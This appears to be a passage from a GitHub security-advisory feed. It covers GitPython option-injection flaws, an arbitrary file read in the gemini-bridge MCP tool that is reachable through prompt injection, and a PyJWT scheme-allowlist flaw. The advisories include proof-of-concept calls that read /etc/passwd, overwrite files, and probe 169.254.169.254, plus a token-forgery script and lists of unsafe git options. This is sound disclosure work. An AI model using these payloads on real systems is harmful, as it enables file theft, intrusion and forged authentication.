<li><a href="https://access.redhat.com/errata/RHSA-2026:10184">https://access.redhat.com/errata/RHSA-2026:10184</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2026:13545">https://access.redhat.com/errata/RHSA-2026:13545</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2026:13553">https://access.redhat.com/errata/RHSA-2026:13553</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-32274">https://access.redhat.com/security/cve/CVE-2026-32274</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2447111">https://bugzilla.redhat.com/show_bug.cgi?id=2447111</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2026-2121.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/black/PYSEC-2026-2121.yaml</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-32274.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-32274.json</a></li>
<li><a href="https://github.com/advisories/GHSA-3936-cmfr-pm3m">https://github.com/advisories/GHSA-3936-cmfr-pm3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3936-cmfr-pm3m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-12T18:33:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Arbitrary file truncation via git rev-list --output argument injection in unguarded Commit.count]]></title>
        <id>https://github.com/advisories/GHSA-p538-c434-8v24</id>
        <link href="https://github.com/advisories/GHSA-p538-c434-8v24"/>
        <updated>2026-08-03T20:23:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Commit.count()</code> forwards <code>**kwargs</code> into <code>rev_list</code> with <strong>no</strong> <code>check_unsafe_options</code> guard (the guard exists only in the sibling <code>iter_items</code>, commit.py:341). <code>git rev-list --output=&lt;path&gt;</code> opens and truncates the target file to 0 bytes before revision parsing, so <code>count(output='/victim')</code> destroys/blanks an arbitrary file.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>commit.py:290-291</code> calls <code>self.repo.git.rev_list(self.hexsha, **kwargs)</code> with no <code>check_unsafe_options</code> and no <code>allow_unsafe_options</code> parameter. The sibling <code>iter_items</code> (commit.py:341) is guarded; <code>count</code> is not. This is a distinct, uncovered sink — GHSA-956x-8gvw-wg5v fixed <code>iter_commits</code>/<code>blame</code>, not <code>count</code>.</p>
<h2 id="impact">Impact</h2>
<p>Destroy/blank an arbitrary file at process privilege (integrity/availability). Reachability is key-control only (<code>count</code> uses <code>self.hexsha</code>, not a user ref), and the write is a 0-byte truncation (no content control), so MEDIUM.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-python">commit.count(output='/path/to/victim')   # victim truncated to 0 bytes (verified)
# control: commit.iter_commits(output=...) raises UnsafeOptionError
</code></pre>
<h2 id="attack-chain">Attack Chain</h2>
<ol>
<li>Entry: app forwards user options -&gt; <code>commit.count(output='/victim')</code>. Guard: none. Bypass proof: <code>iter_commits(output=)</code> raises UnsafeOptionError; <code>count(output=)</code> does not — verified side-by-side.</li>
<li>Sink: <code>git rev-list &lt;sha&gt; --output=/victim</code> -&gt; file truncated to 0 bytes. Impact: destroy/blank arbitrary file.</li>
</ol>
<h2 id="bypass-evidence">Bypass Evidence</h2>
<p>Live-verified on HEAD (tag 3.1.53): <code>count(output=&lt;victim&gt;)</code> truncated a pre-existing file to 0 bytes; guarded <code>iter_commits(output=)</code> raised UnsafeOptionError. Same CNA-accepted "app forwards user options dict" model as GHSA-956x-8gvw-wg5v's <code>archive(**kwargs)</code>. Uncovered sink, not a duplicate.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&lt;= 3.1.53</code></p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add <code>check_unsafe_options</code> to <code>Commit.count</code> (mirroring <code>iter_items</code>).</p>
<hr>
<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-p538-c434-8v24">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-p538-c434-8v24</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2184">https://github.com/gitpython-developers/GitPython/pull/2184</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/38553b6fddc7f6a667cdb45a6762343a08fc72b2">https://github.com/gitpython-developers/GitPython/commit/38553b6fddc7f6a667cdb45a6762343a08fc72b2</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.56">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.56</a></li>
<li><a href="https://github.com/advisories/GHSA-p538-c434-8v24">https://github.com/advisories/GHSA-p538-c434-8v24</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p538-c434-8v24</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:23:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Incomplete unsafe_git_archive_options denylist omits --add-file / --add-virtual-file, enabling arbitrary file read via Repo.archive()]]></title>
        <id>https://github.com/advisories/GHSA-539m-9xh6-q6rr</id>
        <link href="https://github.com/advisories/GHSA-539m-9xh6-q6rr"/>
        <updated>2026-08-03T20:14:29.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Target:</strong> gitpython-developers/GitPython
<strong>Tested:</strong> HEAD <code>07e80555</code> (2026-07-25), latest release 3.1.55, <code>git version 2.50.1</code></p>
<h2 id="summary">Summary</h2>
<p><code>Repo.archive()</code> does call the option guard, so this is not a missing-guard report. The guard is present and working; the <strong>denylist it consults is incomplete</strong>.</p>
<pre><code class="language-python"># git/repo/base.py:169
unsafe_git_archive_options = [
    # Allows arbitrary command execution through the remote git-upload-archive command.
    "--exec",
    # Writes output to a caller-controlled filesystem path.
    "--output",
    "-o",
]
</code></pre>
<p>The comment on <code>--output</code> states the protected class in the project's own words: an option that lets the caller name <strong>a filesystem path</strong> is unsafe. <code>--output</code> is blocked because it <em>writes</em> to a caller-chosen path.</p>
<p><code>git archive</code> also accepts <code>--add-file=&lt;path&gt;</code> and <code>--add-virtual-file=&lt;path:content&gt;</code> (both present in current git; verified against <code>git version 2.50.1</code>). <code>--add-file</code> <em>reads</em> a caller-chosen path — including an absolute path outside the repository — and places the bytes into the archive the caller receives. Neither option is in the list, and no other layer references them:</p>
<pre><code>$ grep -rniE "add.file|add_file" git/
git/index/base.py:771:   R"""Add files from the working tree, ...      # unrelated docstring
</code></pre>
<p>Net effect: the guard blocks arbitrary file <strong>write</strong> at this sink while permitting arbitrary file <strong>read</strong> at the same sink.</p>
<h2 id="reachability-proof-verified-at-the-sink">Reachability proof (verified at the sink)</h2>
<p><code>poc/poc_addfile.py</code> at HEAD <code>07e80555</code>. The PoC creates its own out-of-tree canary, so it runs from a clean machine:</p>
<pre><code>-- CONTROL: options the denylist covers (expect BLOCKED) --
  [BLOCKED] output='/tmp/gp_written.tar': --output is not allowed, use `allow_unsafe_options=True` to allow it.
  [BLOCKED] o='/tmp/gp_written.tar': -o is not allowed, use `allow_unsafe_options=True` to allow it.
  [BLOCKED] exec='touch /tmp/gp_exec': --exec is not allowed, use `allow_unsafe_options=True` to allow it.

-- SIBLING OMITTED FROM THE DENYLIST: --add-file (expect ALLOWED) --
  [ALLOWED] add_file='/tmp/gp_canary.txt'  -&gt; archive 10240 bytes
  archive members: ['f.txt', 'gp_canary.txt']
  &gt;&gt;&gt; EXFILTRATED gp_canary.txt: 'secret-canary-12345'
  &gt;&gt;&gt; byte-for-byte match with the out-of-tree file: CONFIRMED

-- also: --add-virtual-file (attacker-chosen name AND content) --
  [ALLOWED] add_virtual_file='pwn.txt:hello'  -&gt; archive 10240 bytes
</code></pre>
<p>The three blocked lines are the control: they prove the guard is active on this call path, so the fourth result is a gap in list membership rather than a guard that never ran.</p>
<p>Minimal reproduction:</p>
<pre><code class="language-python">import io, tarfile
from git import Repo

buf = io.BytesIO()
Repo("/path/to/repo").archive(buf, format="tar", add_file="/etc/passwd")
print(tarfile.open(fileobj=io.BytesIO(buf.getvalue())).getnames())
# ['&lt;repo files&gt;', 'passwd']   &lt;- contents readable by whoever receives the archive
</code></pre>
<p>The canary is untracked and lives outside the repository; its contents are recovered from the returned archive and asserted byte-for-byte against the on-disk file. The option is rendered by <code>transform_kwargs</code> into <code>--add-file=&lt;path&gt;</code> and reaches <code>git archive</code> unmodified.</p>
<h2 id="direct-precedent">Direct precedent</h2>
<p><code>GHSA-6p8h-3wgx-97gf</code> (High, published 2026-07-22) is the same defect on the sibling list: <em>"Incomplete <code>unsafe_git_clone_options</code> denylist omits <code>--template</code>"</em> — an option absent from one of these denylists, reachable under the same caller-controlled-options precondition, accepted and fixed by adding it. <code>git log</code> shows the archive list itself has already been extended reactively once, in <code>701ce32f</code> (<em>fix: Guard unsafe git command options</em>, GHSA-956x-8gvw-wg5v), and the <code>--template</code> omission was then fixed separately in <code>ffcb5359</code>.</p>
<h2 id="--add-virtual-file-is-the-same-gap-pointing-the-other-way"><code>--add-virtual-file</code> is the same gap pointing the other way</h2>
<p><code>--add-virtual-file=&lt;path:content&gt;</code> lets the caller inject <strong>attacker-chosen content under an attacker-chosen name</strong> into an archive that downstream consumers will reasonably treat as repository-derived. </p>
<h2 id="suggested-remediation">Suggested remediation</h2>
<ol>
<li><strong>Preferred — allowlist.</strong> <code>Repo.archive()</code> has a small legitimate option surface (<code>format</code>, <code>prefix</code>, <code>worktree_attributes</code>, <code>remote</code>, compression level, plus paths). Accepting those and rejecting the rest means a future git release cannot add another path-taking option that silently reopens this.</li>
<li><strong>Minimum — extend the list</strong> with <code>--add-file</code> and <code>--add-virtual-file</code>, and make the membership rule <em>"the option takes a filesystem path or URL"</em> rather than <em>"the option executes a command"</em>. The existing comment on <code>--output</code> already implies that rule; applying it consistently is what closes the class instead of this instance.</li>
</ol>
<h2 id="scope-limits">Scope limits</h2>
<ul>
<li>Impact is <strong>arbitrary file read at the privileges of the process</strong>. Not code execution — I make no such claim here.</li>
<li>It requires the embedding application to forward caller-influenced kwargs into <code>Repo.archive()</code>. That is the identical precondition to <code>--output</code>, <code>--exec</code> and <code>--template</code>, all of which this project has treated as reportable.</li>
</ul>
<h2 id="disclosure">Disclosure</h2>
<h2 id="reported-privately-via-github-private-vulnerability-reporting-happy-to-test-a-candidate-patch-against-the-poc-no-public-disclosure-until-you-have-shipped-a-fix-and-are-ready">Reported privately via GitHub private vulnerability reporting. Happy to test a candidate patch against the PoC. No public disclosure until you have shipped a fix and are ready.</h2>
<h2 id="addendum-2026-07-25--related-observation-on-the-same-membership-question-filed-here-rather-than-separately">Addendum (2026-07-25) — related observation on the same membership question, filed here rather than separately</h2>
<p>While auditing the archive denylist, the same class of gap was identified in unsafe_git_clone_options. A second advisory is not being requested, as the issue is lower severity and should inform the fix for the issue above rather than require separate triage. Recording it here to provide the complete picture in one place.</p>
<p><code>Repo._clone()</code> treats a URL's protocol as a security boundary and applies <code>check_unsafe_protocols()</code> to exactly one input:</p>
<pre><code class="language-python">clone_url = Git.polish_url(url, expand_vars=False)
if not allow_unsafe_protocols:
    Git.check_unsafe_protocols(clone_url)      # the positional url only
</code></pre>
<p><code>git clone</code> accepts a <strong>second</strong> URL via <code>--bundle-uri=&lt;uri&gt;</code>, which git dereferences before the main transport runs. That option is absent from <code>unsafe_git_clone_options</code>, so the option guard passes it, and <code>check_unsafe_protocols()</code> never inspects it. A caller-influenced value therefore drives an outbound request from the host:</p>
<pre><code class="language-python">Repo.clone_from(trusted_url, dest,
                multi_options=["--bundle-uri=http://169.254.169.254/latest/meta-data/"])
# no UnsafeProtocolError, no UnsafeOptionError
</code></pre>
<p>Confirmed against a local listener — the request leaves the process:</p>
<pre><code>127.0.0.1 - - [24/Jul/2026 23:07:41] "GET /internal-metadata HTTP/1.1" 404 -
</code></pre>
<p><code>file:///path</code> is likewise accepted without error. Note this is <strong>not</strong> a tokenisation bypass: <code>multi_options</code> is <code>shlex.split</code> before the check (per <code>c9a26789</code> / GHSA-x2qx-6953-8485), so the fully-split <code>--bundle-uri=...</code> token is checked and legitimately passes because the option is not on the list.</p>
<p>Why it belongs with this report: both are the <em>membership</em> question rather than the matching logic — is the set of blocked options complete, and does the protocol guard inspect every URL git will dereference? The structural remediation proposed above covers both if extended slightly: prefer an allowlist per command, and route <strong>every</strong> URL-bearing option through <code>check_unsafe_protocols()</code>, not only the positional URL. Adding <code>--bundle-uri</code> to <code>unsafe_git_clone_options</code> would be the minimal fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-539m-9xh6-q6rr">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-539m-9xh6-q6rr</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2193">https://github.com/gitpython-developers/GitPython/pull/2193</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca">https://github.com/gitpython-developers/GitPython/commit/7a4f5dcb7bf3cbcbf6e438017efcdfe0bc0d36ca</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57</a></li>
<li><a href="https://github.com/advisories/GHSA-539m-9xh6-q6rr">https://github.com/advisories/GHSA-539m-9xh6-q6rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-539m-9xh6-q6rr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-03T20:14:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Unguarded git option forwarding in IndexFile.checkout() and TagReference.create() enables arbitrary file overwrite and arbitrary file read]]></title>
        <id>https://github.com/advisories/GHSA-3f7w-8rr8-f37f</id>
        <link href="https://github.com/advisories/GHSA-3f7w-8rr8-f37f"/>
        <updated>2026-08-03T20:09:57.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Target:</strong> gitpython-developers/GitPython
<strong>Tested:</strong> HEAD <code>07e80555</code> (2026-07-25), latest release 3.1.55, <code>git version 2.50.1</code>
<strong>Reported instances:</strong> 2 exploitable, from a sweep of 14 unguarded call sites</p>
<h2 id="summary">Summary</h2>
<p>GitPython blocks dangerous git options through <code>Git.check_unsafe_options()</code>, gated per method by an <code>allow_unsafe_options</code> parameter. That guard is applied <strong>per call site</strong>, so any API that forwards <code>**kwargs</code> into a git command without calling it passes caller-controlled options straight to git.</p>
<p>A mechanical sweep of every method that forwards <code>**kwargs</code> into a <code>.git.&lt;command&gt;(...)</code> call found <strong>14 sites with no guard</strong>. Two reach a git option that takes a filesystem path:</p>
<table>
<thead>
<tr>
<th>#</th>
<th>Call site</th>
<th>git option</th>
<th>Impact</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>IndexFile.checkout()</code> → <code>git checkout-index</code></td>
<td><code>--prefix=&lt;path&gt;</code></td>
<td>arbitrary file <strong>overwrite</strong> with repository-controlled content</td>
</tr>
<tr>
<td>2</td>
<td><code>TagReference.create()</code> → <code>git tag</code></td>
<td><code>-F &lt;file&gt;</code> / <code>--file=&lt;file&gt;</code></td>
<td>arbitrary file <strong>read</strong>, returned in-band</td>
</tr>
</tbody></table>
<p>This is the same defect class already fixed in <code>Commit.count()</code> (GHSA-p538-c434-8v24), <code>Repo.archive()</code> and <code>Git.ls_remote()</code> (GHSA-956x-8gvw-wg5v). Both instances below are still present at HEAD.</p>
<hr>
<h2 id="instance-1--indexfilecheckout-arbitrary-file-overwrite">Instance 1 — <code>IndexFile.checkout()</code>: arbitrary file overwrite</h2>
<p><code>git/index/base.py:1210</code> accepts <code>**kwargs</code> and forwards them with no guard:</p>
<pre><code class="language-python">def checkout(self, paths=None, force=False, fprogress=lambda *args: None, **kwargs):
    ...
    proc = self.repo.git.checkout_index(*args, **kwargs)   # line 1331
    ...
    proc = self.repo.git.checkout_index(args, **kwargs)    # line 1349
</code></pre>
<p>There is no <code>allow_unsafe_options</code> parameter and no <code>check_unsafe_options()</code> call in the method.</p>
<p><code>git checkout-index</code> accepts <code>--prefix=&lt;string&gt;</code>, prepended to every output path. It is not confined to the working tree, so an absolute prefix writes tracked file contents anywhere the process can write, and <code>-f</code> overwrites what is already there.</p>
<h3 id="reproduction">Reproduction</h3>
<pre><code class="language-python">from git import Repo
Repo("/path/to/repo").index.checkout(prefix="/tmp/target_dir/", a=True, f=True)
</code></pre>
<p>Observed (<code>poc/poc_checkout_index.py</code>) — no exception raised, files land outside the repository:</p>
<pre><code>[ALLOWED] no UnsafeOptionError raised
files written outside the repo: ['f.txt']
  f.txt: 'hi\n'
</code></pre>
<p>Overwrite of a pre-existing file (<code>poc/poc_ci_overwrite.py</code>) — the victim file held <code>ORIGINAL-DO-NOT-CLOBBER\n</code> before the call:</p>
<pre><code>[ALLOWED] no exception
victim content now: 'hi\n'
OVERWRITTEN: True
</code></pre>
<h3 id="why-this-rates-high">Why this rates High</h3>
<p>Both halves of the write are attacker-influenced:</p>
<ul>
<li><strong>Destination</strong> — the <code>prefix</code> kwarg.</li>
<li><strong>Content</strong> — the bytes written are repository blobs, so anyone who can land a file in the repository (a pull-request branch, a mirrored or untrusted repository, an agent-cloned repository) controls exactly what is written.</li>
</ul>
<p>Commit a file named <code>authorized_keys</code>, <code>.bashrc</code>, <code>config</code> or <code>post-checkout</code>, choose the matching prefix (<code>~/.ssh/</code>, <code>~/</code>, <code>.git/hooks/</code>), and the write becomes code execution as the service account.</p>
<p>For comparison within this project: GHSA-fjr4-x663-mwxc (arbitrary file overwrite via <code>git diff --output</code>) is rated High, and GHSA-p538-c434-8v24 (arbitrary file <em>truncation</em> via <code>git rev-list --output</code>) is rated Medium. <code>--prefix</code> supplies full content control, so it sits at or above the former.</p>
<hr>
<h2 id="instance-2--tagreferencecreate-arbitrary-file-read">Instance 2 — <code>TagReference.create()</code>: arbitrary file read</h2>
<p><code>git/refs/tag.py:88</code> forwards <code>**kwargs</code> into <code>git tag</code> with no guard, and the signature advertises the passthrough:</p>
<pre><code class="language-python">def create(cls, repo, path, reference="HEAD", logmsg=None, force=False, **kwargs):
    """...
    :param kwargs:
        Additional keyword arguments to be passed to :manpage:`git-tag(1)`.
    """
</code></pre>
<p><code>git tag</code> accepts <code>-F &lt;file&gt;</code> / <code>--file=&lt;file&gt;</code>, which reads the tag message from an arbitrary path. The annotated tag object stores that content and GitPython returns it to the caller via <code>TagReference.tag.message</code>, so the file contents come back in-band.</p>
<h3 id="reproduction-1">Reproduction</h3>
<pre><code class="language-python">from git import Repo
from git.refs.tag import TagReference

t = TagReference.create(Repo("/path/to/repo"), "x", force=True, a=True, F="/etc/passwd")
print(t.tag.message)
</code></pre>
<p>Observed (<code>poc/poc_tag_F.py</code>), reading a canary file outside the repository:</p>
<pre><code>[ALLOWED] no UnsafeOptionError raised
&gt;&gt;&gt; tag message recovered from arbitrary path: 'TAG-READ-CANARY-98765\nsecond-line-secret'
</code></pre>
<p>Impact is a read at the privileges of the process. I am not claiming code execution for this instance. The signing options (<code>-s</code>, <code>-u</code>/<code>--local-user</code>) do invoke gpg from the same unguarded kwargs, but I did not develop that into command execution and make no claim about it.</p>
<hr>
<h2 id="sweep-results--the-other-12-sites">Sweep results — the other 12 sites</h2>
<p>Reported so the fix can be scoped once rather than per report. <code>poc/sweep.py</code> reproduces this list.</p>
<table>
<thead>
<tr>
<th>Call site</th>
<th>git command</th>
<th>Assessment</th>
</tr>
</thead>
<tbody><tr>
<td><code>IndexFile.from_tree()</code></td>
<td><code>read-tree</code></td>
<td><code>--index-output=&lt;path&gt;</code> looked reachable but is <strong>neutralised</strong>: GitPython appends its own <code>--index-output</code> after the caller's kwargs and git honours the last occurrence. Verified — victim file unchanged (<code>poc/poc_readtree.py</code>)</td>
</tr>
<tr>
<td><code>IndexFile.remove()</code></td>
<td><code>rm</code></td>
<td><code>--pathspec-from-file</code> only reads a pathspec; no write or disclosure primitive found</td>
</tr>
<tr>
<td><code>IndexFile.move()</code></td>
<td><code>mv</code></td>
<td>same</td>
</tr>
<tr>
<td><code>HEAD.reset()</code></td>
<td><code>reset</code></td>
<td>same</td>
</tr>
<tr>
<td><code>HEAD.checkout()</code></td>
<td><code>checkout</code></td>
<td>same</td>
</tr>
<tr>
<td><code>Head.delete()</code>, <code>RemoteReference.delete()</code></td>
<td><code>branch</code></td>
<td>no path-taking option found</td>
</tr>
<tr>
<td><code>Repo.merge_base()</code></td>
<td><code>merge-base</code></td>
<td>no path-taking option found</td>
</tr>
<tr>
<td><code>Repo._get_untracked_files()</code></td>
<td><code>status</code></td>
<td>no path-taking option found</td>
</tr>
<tr>
<td><code>Remote.set_url()</code>, <code>Remote.create()</code>, <code>Remote.update()</code></td>
<td><code>remote</code></td>
<td>URL handling already addressed by GHSA-94p4-4cq8-9g67</td>
</tr>
</tbody></table>
<h2 id="suggested-remediation">Suggested remediation</h2>
<p><strong>Immediate:</strong> add <code>allow_unsafe_options: bool = False</code> to both methods and gate <code>Git._option_candidates(args, kwargs)</code> against new lists — <code>unsafe_git_checkout_index_options = ["--prefix"]</code> (consider <code>--temp</code>) and <code>unsafe_git_tag_options = ["--file", "-F"]</code> (consider <code>-s</code>, <code>-u</code>/<code>--local-user</code>, <code>--cleanup</code>) — matching the pattern used in <code>Repo.archive()</code> and <code>Commit.count()</code>.</p>
<p><strong>Structural:</strong> this defect has now been fixed four times in four places (<code>Repo.archive()</code>, <code>Git.ls_remote()</code>, <code>Commit.count()</code>, and the two here), because the guard is opt-in per method: every new <code>**kwargs</code>-forwarding API starts unguarded and stays that way until someone reports it. Enforcing the check centrally in <code>Git._call_process()</code> — each git invocation consults a per-command unsafe-option table unless the caller opts out — would make new call sites safe by default rather than by review, and would close the remaining sites in the table above at the same time.</p>
<h2 id="disclosure">Disclosure</h2>
<p>Reported privately via GitHub private vulnerability reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3f7w-8rr8-f37f">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-3f7w-8rr8-f37f</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/pull/2193">https://github.com/gitpython-developers/GitPython/pull/2193</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c">https://github.com/gitpython-developers/GitPython/commit/3af0c2516c5e18c829da30338614688f6b69b49c</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.57</a></li>
<li><a href="https://github.com/advisories/GHSA-3f7w-8rr8-f37f">https://github.com/advisories/GHSA-3f7w-8rr8-f37f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f7w-8rr8-f37f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T20:09:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gemini-bridge] gemini-bridge vulnerable to arbitrary local file read via consult_gemini_with_files inline mode]]></title>
        <id>https://github.com/advisories/GHSA-c5px-58j2-7fqp</id>
        <link href="https://github.com/advisories/GHSA-c5px-58j2-7fqp"/>
        <updated>2026-07-31T22:31:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>consult_gemini_with_files</code> in <strong>inline mode</strong> read any file path supplied in
the <code>files</code> argument without confining it to the working <code>directory</code>, then
forwarded the contents to the Gemini CLI. Because the caller also controls
<code>query</code>, the file contents are echoed back through the Gemini round-trip
(and sent to Google), making this an arbitrary local file read.</p>
<h3 id="impact">Impact</h3>
<p>An MCP client — or an LLM that has been prompt-injected into calling the tool —
can read <strong>any file the server process can access</strong> (SSH keys, cloud
credentials, <code>.env</code>, source) and have it disclosed via the tool response.
No code execution by itself.</p>
<h3 id="affected-component">Affected component</h3>
<ul>
<li>Tool: <code>consult_gemini_with_files(query, directory, files, …)</code>, <code>mode="inline"</code></li>
<li>Sink: <code>_read_file_for_inline</code> via <code>_prepare_inline_payload</code> in <code>src/mcp_server.py</code></li>
<li>The <code>at_command</code> mode already confined paths; inline mode did not.</li>
</ul>
<h3 id="root-cause">Root cause</h3>
<p><code>_resolve_path</code> returned an out-of-root path while only nullifying the <em>display</em>
name, and <code>_prepare_inline_payload</code> read the file regardless. Absolute paths,
<code>..</code> traversal, and symlink escapes were all accepted.</p>
<h3 id="patch">Patch</h3>
<p>Fixed in <strong>1.3.1</strong>. <code>_resolve_path</code> now resolves symlinks and confines via
<code>Path.relative_to(root)</code>; inline mode skips any entry that resolves outside the
working directory (the same guard <code>at_command</code> already enforced).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to 1.3.1. Before upgrading, avoid <code>mode="inline"</code> with untrusted
<code>files</code> input, or run the server with a restricted-permission user.</p>
<h3 id="credit">Credit</h3>
<p>Reported privately by Zhihao Zhang (WPI).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eLyiN/gemini-bridge/security/advisories/GHSA-c5px-58j2-7fqp">https://github.com/eLyiN/gemini-bridge/security/advisories/GHSA-c5px-58j2-7fqp</a></li>
<li><a href="https://github.com/eLyiN/gemini-bridge/pull/9">https://github.com/eLyiN/gemini-bridge/pull/9</a></li>
<li><a href="https://github.com/eLyiN/gemini-bridge/commit/8f3b85afd02b692c4bc974b5176e12fb277ea801">https://github.com/eLyiN/gemini-bridge/commit/8f3b85afd02b692c4bc974b5176e12fb277ea801</a></li>
<li><a href="https://github.com/eLyiN/gemini-bridge/releases/tag/v1.3.1">https://github.com/eLyiN/gemini-bridge/releases/tag/v1.3.1</a></li>
<li><a href="https://github.com/advisories/GHSA-c5px-58j2-7fqp">https://github.com/advisories/GHSA-c5px-58j2-7fqp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c5px-58j2-7fqp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-31T22:31:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyJWT] PyJWKClient: missing scheme allowlist enables CVE-2024-21643-class SSRF + token forgery via file://, ftp://, data: schemes]]></title>
        <id>https://github.com/advisories/GHSA-993g-76c3-p5m4</id>
        <link href="https://github.com/advisories/GHSA-993g-76c3-p5m4"/>
        <updated>2026-07-31T22:13:16.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>[!NOTE]
The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. Severity is scored for the scheme-acceptance bug in isolation.</p>
</blockquote>
<h2 id="summary">Summary</h2>
<p>PyJWKClient passes its <code>uri</code> argument directly to <code>urllib.request.urlopen()</code> which uses Python stdlib's default <code>OpenerDirector</code> registering <code>HTTPHandler</code>, <code>HTTPSHandler</code>, <code>FTPHandler</code>, <strong><code>FileHandler</code></strong>, and <code>DataHandler</code>. There is currently no documented option to restrict which schemes PyJWKClient will fetch.</p>
<p>If an application's <code>jku</code> URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can:</p>
<ol>
<li>Cause PyJWKClient to read arbitrary local files via <code>file://</code> (SSRF on local filesystem) — the file's contents are passed to <code>json.load</code>.</li>
<li>Cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface).</li>
<li><strong>Forge tokens that PyJWT verifies as valid</strong> — if the attacker can write to any path the JKU URL points at AND influences the URL, they can plant a JWK Set containing their own public key, sign tokens with the matching private key, and <code>jwt.decode()</code> accepts.</li>
</ol>
<h2 id="affected-versions">Affected versions</h2>
<p>Tested and reproducible on <strong>PyJWT 2.11.0 and 2.12.1</strong>. Likely all versions back to PyJWKClient introduction.</p>
<h2 id="reproducer-full-attack-chain--verified-empirically">Reproducer (full attack chain — verified empirically)</h2>
<pre><code class="language-python">import jwt as pyjwt
from jwt import PyJWKClient
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64, time

# Attacker generates keypair (no relation to real IdP)
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_n = key.public_key().public_numbers().n

def b64u(n):
    bl = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(bl, 'big')).rstrip(b'=').decode()

# Attacker writes JWK Set containing their public key to /tmp
jwks = {"keys":[{"kty":"RSA","kid":"attacker","use":"sig","alg":"RS256",
                  "n":b64u(pub_n),"e":"AQAB"}]}
with open("/tmp/attacker.json","w") as f:
    json.dump(jwks, f)

# Attacker mints token signed with their private key, jku=file://
priv_pem = key.private_bytes(serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
now = int(time.time())
token = pyjwt.encode(
    {"sub":"attacker","aud":"target-app","iat":now,"exp":now+3600},
    priv_pem, algorithm="RS256",
    headers={"kid":"attacker","jku":"file:///tmp/attacker.json","typ":"JWT"})

# Vulnerable application pattern: caller derives jku from token header
# and passes to PyJWKClient without scheme validation
header = pyjwt.get_unverified_header(token)
client = PyJWKClient(header["jku"])      # &lt;-- accepts file:// silently
